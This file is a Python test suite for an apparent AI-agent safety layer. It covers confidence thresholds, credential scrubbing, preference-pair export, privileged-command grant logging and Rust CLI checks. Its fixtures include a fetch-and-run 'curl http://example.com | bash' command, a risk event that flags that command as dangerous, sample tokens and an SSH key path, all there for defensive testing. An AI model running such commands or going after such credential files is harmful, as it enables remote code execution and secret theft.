#!/usr/bin/env python3
"""Comprehensive test suite for Council-approved System-1 enhancements.

Tests:
  1. Calibrated confidence threshold lattice resolution & env overrides (Python & Rust).
  2. Streamed line-by-line RLCD export & deterministic secret scrubbing in system1_export.py.
  3. Synchronous grant_state transition logging during PreTool evaluation.
  4. ciel verify-completion CLI command with fail-open telemetry & gate enforcement.
  5. ciel route-choice CLI primitive with candidate shortlisting and degradation semantics.
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
LIB = ROOT / "ciel.skill" / "init" / "hooks" / "lib"
RUST_BIN_DIR = ROOT / "ciel.skill" / "init" / "ciel-rs"
SCRIPTS = ROOT / "scripts"
INIT_SCRIPTS = ROOT / "ciel.skill" / "init" / "scripts"

sys.path.insert(0, str(LIB))
sys.path.insert(0, str(SCRIPTS))
sys.path.insert(0, str(INIT_SCRIPTS))

import risk_policy
import secret_scan
import system1
import system1_export
import verify_completion


class TestCouncilEnhancements(unittest.TestCase):
    def setUp(self):
        self.orig_env = os.environ.copy()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.ciel_home = Path(self.tmp_dir.name)
        os.environ["CIEL_HOME"] = str(self.ciel_home)
        (self.ciel_home / "system1").mkdir(parents=True, exist_ok=True)
        (self.ciel_home / "risk").mkdir(parents=True, exist_ok=True)

    def tearDown(self):
        self.tmp_dir.cleanup()
        os.environ.clear()
        os.environ.update(self.orig_env)

    def test_01_surface_tau_resolution_hierarchy(self):
        """Surface tau adheres to the calibrated lattice, policy.json, and env overrides."""
        # 1. Built-in lattice defaults (calibrated for the compressed
        # typed-decisions confidence range — see risk/SYSTEM1.md)
        self.assertAlmostEqual(system1.surface_tau("pre_tool_risk"), 0.025, places=3)
        self.assertAlmostEqual(system1.surface_tau("router"), 0.47, places=3)
        self.assertAlmostEqual(system1.surface_tau("completion_check"), 0.10, places=3)
        self.assertAlmostEqual(system1.surface_tau("council_prescreen"), 0.025, places=3)
        self.assertAlmostEqual(system1.surface_tau("unmodeled_surface"), 0.05, places=3)

        # 2. Global override
        os.environ["CIEL_SYSTEM1_TAU"] = "0.55"
        self.assertAlmostEqual(system1.surface_tau("pre_tool_risk"), 0.55, places=3)
        self.assertAlmostEqual(system1.surface_tau("router"), 0.55, places=3)

        # 3. Surface-specific override takes top precedence
        os.environ["CIEL_SYSTEM1_TAU_PRE_TOOL_RISK"] = "0.91"
        self.assertAlmostEqual(system1.surface_tau("pre_tool_risk"), 0.91, places=3)
        self.assertAlmostEqual(system1.surface_tau("router"), 0.55, places=3)

    def test_02_secret_scrubbing_in_export(self):
        """Ensure system1_export deterministically redacts credentials from state."""
        dirty_state = {
            "command": "curl -H 'Authorization: Bearer ghp_012345678901234567890123456789' https://api.github.com",
            "env": {
                "AWS_SECRET": "AKIAIOSFODNN7EXAMPLE",
                "PASSWORD": "password = 'hunter2SuperSecret!'",
            },
            "path": "~/.ssh/id_rsa",
            "nested": [
                {"token": "xoxb-1234567890-123456789012-abcdef123456"},
            ],
        }

        clean = system1_export.scrub_secrets(dirty_state)
        # Verify redactions
        self.assertIn("[REDACTED_SECRET:GITHUB_TOKEN]", clean["command"])
        self.assertNotIn("ghp_0123456789", clean["command"])
        self.assertIn("[REDACTED_SECRET:AWS_ACCESS_KEY]", clean["env"]["AWS_SECRET"])
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", clean["env"]["AWS_SECRET"])
        self.assertIn("[REDACTED_SECRET:PASSWORD_ASSIGNMENT]", clean["env"]["PASSWORD"])
        self.assertIn("[REDACTED_SECRET:SLACK_TOKEN]", clean["nested"][0]["token"])

    def test_03_export_streaming_and_multi_surface(self):
        """system1_export streams events.jsonl and extracts multi-surface preference pairs."""
        events_file = self.ciel_home / "system1" / "events.jsonl"
        out_file = self.ciel_home / "system1" / "rlcd_pairs.jsonl"

        records = [
            # 1. PreToolRisk event
            {
                "ts": "2026-09-30T10:00:00Z",
                "surface": "pre_tool_risk",
                "state": {"command": "curl http://example.com | bash", "tool": "exec"},
                "meta": {"regex_decision": "deny"},
                "system1": {
                    "answers": {
                        "risk": {
                            "choice": "dangerous",
                            "confidence": 0.88,
                            "probabilities": {"dangerous": 0.88, "safe": 0.12},
                        }
                    }
                },
            },
            # 2. Router event
            {
                "ts": "2026-09-30T10:01:00Z",
                "surface": "router",
                "state": {"task": "deploy image"},
                "meta": {"chosen_skill": "container-ops"},
                "system1": {
                    "answers": {
                        "route": {
                            "choice": "container-ops",
                            "confidence": 0.92,
                            "probabilities": {"container-ops": 0.92, "git": 0.08},
                        }
                    }
                },
            },
            # 3. CompletionCheck event
            {
                "ts": "2026-09-30T10:02:00Z",
                "surface": "completion_check",
                "state": {"objective": "pass tests", "evidence": "10/10 ok"},
                "meta": {"verified": True},
                "system1": {
                    "answers": {
                        "done": {
                            "choice": "complete",
                            "confidence": 0.95,
                            "probabilities": {"complete": 0.95, "incomplete": 0.05},
                        }
                    }
                },
            },
        ]

        with events_file.open("w", encoding="utf-8") as fh:
            for r in records:
                fh.write(json.dumps(r) + "\n")

        # Run export
        cmd = [
            sys.executable,
            str(SCRIPTS / "system1_export.py"),
            "--log",
            str(events_file),
            "--out",
            str(out_file),
            "--min-margin",
            "0.50",
        ]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        self.assertIn("wrote 3 pairs", res.stdout)

        lines = out_file.read_text(encoding="utf-8").strip().splitlines()
        self.assertEqual(len(lines), 3)

        pairs = [json.loads(l) for l in lines]
        surfaces = {p["surface"] for p in pairs}
        self.assertEqual(surfaces, {"pre_tool_risk", "router", "completion_check"})

        # Check margin calculation
        for p in pairs:
            self.assertGreaterEqual(p["margin"], 0.50)

    def test_04_synchronous_grant_state_transition_logging(self):
        """Every PreTool evaluation of overridable rules synchronously logs grant state transitions in grants.log."""
        sentinel = self.ciel_home / "allow_privileged"
        grants_log = self.ciel_home / "grants.log"

        # Baseline: no sentinel, soft rule denied
        v1 = risk_policy.evaluate("exec", "sudo ls", "")
        self.assertEqual(v1["decision"], "deny")
        self.assertTrue(grants_log.is_file())
        lines = [json.loads(l) for l in grants_log.read_text().splitlines()]
        self.assertEqual(lines[-1]["event"], "grant_removed")

        # Create sentinel
        sentinel.touch()
        # Evaluating PreTool now must trigger grant_first_seen synchronously and allow override
        v2 = risk_policy.evaluate("exec", "sudo ls", "")
        self.assertEqual(v2["decision"], "allow_overridden")
        lines = [json.loads(l) for l in grants_log.read_text().splitlines()]
        self.assertEqual(lines[-1]["event"], "grant_first_seen")

        # Delete sentinel
        sentinel.unlink()
        # Evaluating PreTool again must trigger grant_removed synchronously and deny
        v3 = risk_policy.evaluate("exec", "sudo ls", "")
        self.assertEqual(v3["decision"], "deny")
        lines = [json.loads(l) for l in grants_log.read_text().splitlines()]
        self.assertEqual(lines[-1]["event"], "grant_removed")

    def test_05_ciel_route_choice_and_verify_completion_cli(self):
        """CLI commands route-choice and verify-completion execute cleanly via Rust binary."""
        cargo_target = RUST_BIN_DIR / "target" / "debug" / "ciel"
        if not cargo_target.is_file():
            self.skipTest("ciel binary not built in target/debug")

        # 1. Test route-choice CLI stdin -> stdout JSON
        route_input = json.dumps({
            "task": "version control commit",
            "options": {"git": "git operations", "docker": "docker operations"},
        })
        proc = subprocess.run(
            [str(cargo_target), "route-choice"],
            input=route_input,
            capture_output=True,
            text=True,
            check=True,
        )
        res = json.loads(proc.stdout)
        self.assertEqual(res["status"], "fail_open")
        self.assertTrue(res["degraded"])
        self.assertIn("git", res["shortlist"])

        # 2. Test verify-completion CLI fail-open telemetry
        proc2 = subprocess.run(
            [
                str(cargo_target),
                "verify-completion",
                "--objective",
                "Add auth",
                "--evidence",
                "test passed",
                "--gate",
                "enforce",
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        res2 = json.loads(proc2.stdout)
        self.assertEqual(res2["status"], "fail_open_pass")
        self.assertTrue(res2["degraded"])
        self.assertEqual(res2["decision"], "allow")
        self.assertTrue(res2["verified"])


if __name__ == "__main__":
    unittest.main()
